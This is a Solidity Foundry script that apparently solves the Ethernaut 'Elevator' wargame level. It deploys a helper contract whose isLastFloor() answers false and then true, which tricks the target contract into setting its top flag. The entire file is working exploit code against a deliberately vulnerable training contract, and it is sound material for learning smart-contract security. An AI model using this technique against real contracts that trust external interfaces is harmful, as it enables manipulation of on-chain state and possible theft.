// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../lib/forge-std/src/Script.sol";
import {Elevator} from "../src/Elevator.sol";

// Script to deploy and execute the Elevator attack helper contract
contract ElevatorExploitDeployer is Script {
    // Instance of the ElevatorHelper contract
    ElevatorHelper public helperInstance;
    
    // Address of the vulnerable Elevator contract instance
    address elevatorContractAddress = 0xYourInstanceAddressHere;  // Replace with the actual instance address

    // Main function to deploy and trigger the attack
    function run() external {
        // Start broadcasting the transaction using the private key from the .env file
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Deploy the ElevatorHelper contract and pass the Elevator contract's address
        helperInstance = new ElevatorHelper(elevatorContractAddress);

        // Trigger the exploit by calling sendCall on the helper contract
        helperInstance.sendCall();

        // Stop broadcasting the transaction
        vm.stopBroadcast();
    }
}

// Helper contract to exploit the vulnerability in the Elevator contract
contract ElevatorHelper {
    uint256 public callCounter;  // Counter to keep track of how many times isLastFloor() has been called
    Elevator public elevatorContract;  // Instance of the Elevator contract

    // Constructor: Initializes the contract with the address of the Elevator contract
    constructor(address elevatorAddress) {
        elevatorContract = Elevator(elevatorAddress);
    }

    // Function to manipulate the isLastFloor logic
    // First call returns false, second call returns true to exploit the contract
    function isLastFloor(uint _floor) external returns (bool) {
        callCounter++;
        // On the first call, return false to trick the contract into moving the elevator
        if (callCounter == 1) {
            return false;
        } else {
            // On the second call, return true to set the top flag in the Elevator contract
            return true;
        }
    }

    // Function to initiate the exploit by calling the goTo function on the Elevator contract
    function sendCall() public {
        elevatorContract.goTo(3);  // Call the goTo function to move to floor 3
    }
}